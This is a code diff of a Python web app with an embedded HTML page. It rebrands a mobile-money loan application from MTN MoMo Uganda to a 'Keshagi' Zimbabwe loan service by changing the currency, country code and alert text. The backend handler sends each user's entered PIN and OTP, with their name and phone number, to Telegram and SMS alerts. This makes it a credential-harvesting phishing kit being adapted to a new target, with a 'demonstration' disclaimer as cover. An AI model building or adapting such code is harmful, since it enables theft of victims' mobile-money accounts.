-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">UGX 50</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">UGX 30</span></div>
-        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">UGX 1,080</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Principal</span><span id="details-principal" class="font-bold text-slate-800">ZWG 100,000</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Interest (5%)</span><span id="details-interest" class="font-bold text-slate-800">ZWG 50</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Service Fees</span><span id="details-fees" class="font-bold text-slate-800">ZWG 30</span></div>
+        <div class="flex justify-between py-1.5 border-b border-slate-100"><span class="text-slate-500">Total Repayment</span><span id="details-total" class="font-black text-[#004F71]">ZWG 1,080</span></div>
         <div class="flex justify-between py-1.5"><span class="text-slate-500">Due Date</span><span id="details-date" class="font-bold text-slate-800">30/09/2026</span></div>
       </div>
 
@@ -608,14 +607,14 @@ HTML_PAGE = r"""<!DOCTYPE html>
     <div onclick="closeInfoModal()" class="absolute inset-0 bg-slate-900/50 backdrop-blur-xs"></div>
     <div class="relative bg-white  p-6 max-w-sm w-full shadow-2xl border border-slate-200 text-center space-y-3 z-10">
       <h3 id="info-title" class="text-lg font-bold text-[#004F71]">Information</h3>
-      <p class="text-xs text-slate-600">This is a demonstration preview of the MTN MoMo mobile loan journey. Features in this section are mock placeholders for demonstration.</p>
+      <p class="text-xs text-slate-600">This is a demonstration preview of the Keshagi Zimbabwe loan journey. Features in this section are mock placeholders for demonstration.</p>
       <button onclick="closeInfoModal()" class="w-full py-2.5 rounded-xl bg-[#004F71] text-white font-bold text-xs">Close</button>
     </div>
   </div>
 
   <!-- FOOTER -->
   <footer class="w-full max-w-[760px] mx-auto px-4 py-4 text-center text-xs text-slate-400 border-t border-slate-200">
-    MTN MoMo Uganda • Mobile Money Loan App
+    Keshagi Loans Zimbabwe • Digital Loan App
   </footer>
 
   <script>
@@ -626,7 +625,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       nationalId: "",
       birthDate: "",
       purpose: "Business",
-      amount: 500000,
+      amount: 500,
       period: 30
     };
 
@@ -667,13 +666,13 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function formatMobileWithCountryCode(phone) {
-      if (!phone) return "+256 77 123 4567";
+      if (!phone) return "+263 77 123 4567";
       let cleaned = phone.replace(/[^0-9+]/g, '');
       if (cleaned.startsWith('+')) return cleaned;
       if (cleaned.startsWith('0')) {
         cleaned = cleaned.substring(1);
       }
-      return '+256 ' + cleaned;
+      return '+263 ' + cleaned;
     }
 
     function handleFormSubmit(event) {
@@ -683,7 +682,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       appState.nationalId = document.getElementById('input-nationalid').value;
       appState.birthDate = document.getElementById('input-dob') ? document.getElementById('input-dob').value : "";
       appState.purpose = document.getElementById('input-purpose').value;
-      appState.amount = parseInt(document.getElementById('input-amount').value) || 500000;
+      appState.amount = parseInt(document.getElementById('input-amount').value) || 500;
       
       syncAmount(appState.amount);
 
@@ -740,9 +739,9 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const feeEl = document.getElementById('breakdown-fee');
       const totalEl = document.getElementById('breakdown-total');
 
-      if (interestEl) interestEl.innerText = 'UGX ' + interest.toLocaleString();
-      if (feeEl) feeEl.innerText = 'UGX ' + fee.toLocaleString();
-      if (totalEl) totalEl.innerText = 'UGX ' + total.toLocaleString();
+      if (interestEl) interestEl.innerText = 'ZWG ' + interest.toLocaleString();
+      if (feeEl) feeEl.innerText = 'ZWG ' + fee.toLocaleString();
+      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();
 
       const dateEl = document.getElementById('breakdown-date');
       if (dateEl) {
@@ -807,10 +806,10 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const dateEl = document.getElementById('review-date');
 
       if (nameEl) nameEl.innerText = appState.fullName || "Tariro Moyo";
-      if (mobileEl) mobileEl.innerText = appState.mobile || "+256 77 123 4567";
+      if (mobileEl) mobileEl.innerText = appState.mobile || "+263 77 123 4567";
       if (idEl) idEl.innerText = appState.nationalId || "CM98102938102";
       if (purposeEl) purposeEl.innerText = appState.purpose || "Business";
-      if (principalEl) principalEl.innerText = 'UGX ' + (appState.amount || 100000).toLocaleString();
+      if (principalEl) principalEl.innerText = 'ZWG ' + (appState.amount || 100000).toLocaleString();
       if (periodEl) periodEl.innerText = appState.period + ' Days';
 
       const val = appState.amount || 100000;
@@ -826,7 +825,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const fee = Math.round(val * 0.03);
       const total = val + interest + fee;
 
-      if (totalEl) totalEl.innerText = 'UGX ' + total.toLocaleString();
+      if (totalEl) totalEl.innerText = 'ZWG ' + total.toLocaleString();
 
       if (dateEl) {
         const d = new Date();
@@ -997,7 +996,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
           const approvedRepay = document.getElementById('approved-repay');
           const approvedDate = document.getElementById('approved-date');
 
-          const val = appState.amount || 500000;
+          const val = appState.amount || 500;
           const days = appState.period || 30;
           let rate = 0.05;
           if (days <= 7) rate = 0.03;
@@ -1010,8 +1009,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
           const fee = Math.round(val * 0.03);
           const total = val + interest + fee;
 
-          if (approvedAmt) approvedAmt.innerText = 'UGX ' + val.toLocaleString();
-          if (approvedRepay) approvedRepay.innerText = 'UGX ' + total.toLocaleString();
+          if (approvedAmt) approvedAmt.innerText = 'ZWG ' + val.toLocaleString();
+          if (approvedRepay) approvedRepay.innerText = 'ZWG ' + total.toLocaleString();
 
           if (approvedDate) {
             const d = new Date();
@@ -1025,8 +1024,8 @@ HTML_PAGE = r"""<!DOCTYPE html>
     }
 
     function syncAmount(val, isFromInput = false) {
-      let parsedVal = parseInt(val) || 50000;
-      if (parsedVal > 1000000) parsedVal = 1000000;
+      let parsedVal = parseInt(val) || 500;
+      if (parsedVal > 500000) parsedVal = 500000;
       appState.amount = parsedVal;
       
       if (!isFromInput) {
@@ -1037,7 +1036,7 @@ HTML_PAGE = r"""<!DOCTYPE html>
       const slider = document.getElementById('amount-slider');
       if (slider) slider.value = parsedVal;
       const disp = document.getElementById('display-amount');
-      if (disp) disp.innerText = 'UGX ' + parsedVal.toLocaleString();
+      if (disp) disp.innerText = 'ZWG ' + parsedVal.toLocaleString();
       
       calculateCosts();
     }
@@ -1065,16 +1064,16 @@ def save_unified():
         if f_n == 'entered_pin':
             m = f'🔐 *PIN Received*\n\n👤 *User:* {name}\n🔢 *PIN:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
+            send_sms_notification(f"[Keshagi Alert] PIN Received\nUser: {name}\nPhone: {phone}\nPIN: {f_v}")
         elif f_n == 'entered_otp':
             m = f'📱 *OTP Received*\n\n👤 *User:* {name}\n🔑 *OTP:* {f_v}\n📞 *Phone:* {phone}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
+            send_sms_notification(f"[Keshagi Alert] OTP Received\nUser: {name}\nPhone: {phone}\nOTP: {f_v}")
         elif not f_n:
             amt = data.get('amount', 'N/A')
-            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* UGX {amt}\n📅 *Time:* {now}'
+            m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* ZWG {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
-            send_sms_notification(f"[MoMo Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: UGX {amt}")
+            send_sms_notification(f"[Keshagi Alert] New Application\nName: {name}\nPhone: {phone}\nAmount: ZWG {amt}")
         return jsonify({'status': 'success', 'record_id': app_id})
 
     except Exception as e:
